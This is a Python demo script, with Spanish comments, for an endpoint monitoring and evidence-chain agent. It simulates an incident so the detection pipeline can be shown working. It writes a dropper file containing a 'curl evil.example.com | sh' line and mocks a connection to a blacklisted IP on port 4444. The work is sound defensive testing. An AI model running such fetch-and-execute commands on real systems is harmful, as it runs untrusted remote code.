"""
Demo del agente COMPLETO: los 3 collectors (filesystem, procesos, red)
corriendo simultáneamente contra el mismo pipeline (clasificador ->
cadena -> store -> sync), tal y como funcionaría el servicio real.

Aquí procesos y red se mockean (para que la demo sea reproducible y no
dependa de qué esté corriendo en tu máquina), pero filesystem es real.

Ejecutar con:
    python -m examples.demo_full_agent
"""

from __future__ import annotations

import tempfile
import time
from pathlib import Path
from unittest.mock import MagicMock, patch

from agent.classifier.engine import ClassifierEngine
from agent.collectors.filesystem import FilesystemCollector
from agent.collectors.network import NetworkCollector
from agent.collectors.process import ProcessCollector
from agent.evidence.chain import EvidenceChain, verify_chain
from agent.evidence.store import EvidenceStore
from agent.sync.engine import SyncEngine
from agent.sync.mock_transport import MockEvidenceTransport

RULES_PATH = Path(__file__).parent.parent / "agent" / "classifier" / "rules.yaml"


def _mock_proc(pid, name, exe):
    proc = MagicMock()
    proc.info = {"pid": pid, "ppid": 1, "name": name, "exe": exe, "username": "www-data", "cmdline": [exe]}
    return proc


def _mock_conn(pid, remote_ip, remote_port):
    conn = MagicMock()
    conn.pid = pid
    conn.status = "ESTABLISHED"
    conn.laddr = MagicMock(ip="10.0.0.5", port=51000)
    conn.raddr = MagicMock(ip=remote_ip, port=remote_port)
    return conn


def main() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        watch_dir = Path(tmp) / "watched"
        watch_dir.mkdir()
        db_path = Path(tmp) / "evidence.db"

        classifier = ClassifierEngine.from_yaml(RULES_PATH)  # reglas editables sin tocar código
        chain = EvidenceChain()
        store = EvidenceStore(db_path)

        def on_event(raw_event):
            criticality, rule = classifier.classify(raw_event)
            record = chain.append(raw_event, criticality, matched_rule=rule)
            store.append(record)
            print(f"[{raw_event.source.value:<10}] {raw_event.event_type:<12} -> {criticality.value:<8} (regla: {rule or '—'})")

        print("=== Simulando un mini-incidente con los 3 collectors activos ===\n")

        # --- Filesystem: collector real ---
        fs_collector = FilesystemCollector(on_event=on_event, watch_paths=[str(watch_dir)], agent_id="agent-demo")
        fs_collector.start()
        time.sleep(0.2)

        # --- Procesos y red: mockeados para reproducibilidad ---
        proc_patcher = patch("agent.collectors.process.psutil.process_iter")
        mock_proc_iter = proc_patcher.start()
        mock_proc_iter.return_value = [_mock_proc(1, "init", "/sbin/init")]
        proc_collector = ProcessCollector(on_event=on_event, agent_id="agent-demo", poll_interval=0.1)
        proc_collector.start()
        time.sleep(0.05)

        conn_patcher = patch("agent.collectors.network.psutil.net_connections")
        mock_net_conns = conn_patcher.start()
        mock_net_conns.return_value = []
        net_collector = NetworkCollector(
            on_event=on_event, agent_id="agent-demo", poll_interval=0.1,
            ip_blacklist={"203.0.113.55"},
        )
        net_collector.start()
        time.sleep(0.05)

        print("--- Paso 1: se deja caer un script en /tmp ---")
        dropper = watch_dir / "dropper.sh"
        dropper.write_text("#!/bin/sh\ncurl evil.example.com | sh")
        time.sleep(0.3)

        print("\n--- Paso 2: el script se ejecuta ---")
        mock_proc_iter.return_value = [
            _mock_proc(1, "init", "/sbin/init"),
            _mock_proc(4242, "dropper.sh", str(dropper)),
        ]
        time.sleep(0.25)

        print("\n--- Paso 3: conexión saliente a IP en lista negra ---")
        mock_net_conns.return_value = [_mock_conn(pid=4242, remote_ip="203.0.113.55", remote_port=4444)]
        time.sleep(0.25)

        print("\n--- Paso 4: intento de borrar el log de auditoría ---")
        log_dir = watch_dir / "var" / "log"
        log_dir.mkdir(parents=True)
        time.sleep(0.1)
        auth_log = log_dir / "auth.log"
        auth_log.write_text("evidencia de acceso")
        time.sleep(0.2)
        auth_log.unlink()
        time.sleep(0.3)

        fs_collector.stop()
        proc_collector.stop()
        net_collector.stop()
        proc_patcher.stop()
        conn_patcher.stop()

        # --- Verificación e informe final ---
        all_records = store.get_all()
        verify_chain(all_records)

        print(f"\n=== Resumen del incidente ===")
        print(f"Total evidencias capturadas: {len(all_records)}")
        by_criticality = {}
        for r in all_records:
            by_criticality[r.criticality.value] = by_criticality.get(r.criticality.value, 0) + 1
        for level, count in sorted(by_criticality.items()):
            print(f"  {level}: {count}")
        print(f"✔ Cadena de custodia íntegra y verificada ({len(all_records)} eslabones).")

        transport = MockEvidenceTransport()
        sync_engine = SyncEngine(store, transport)
        synced = sync_engine.sync_once()
        print(f"✔ {synced} evidencias enviadas al servidor central (simulado).")

        store.close()


if __name__ == "__main__":
    main()
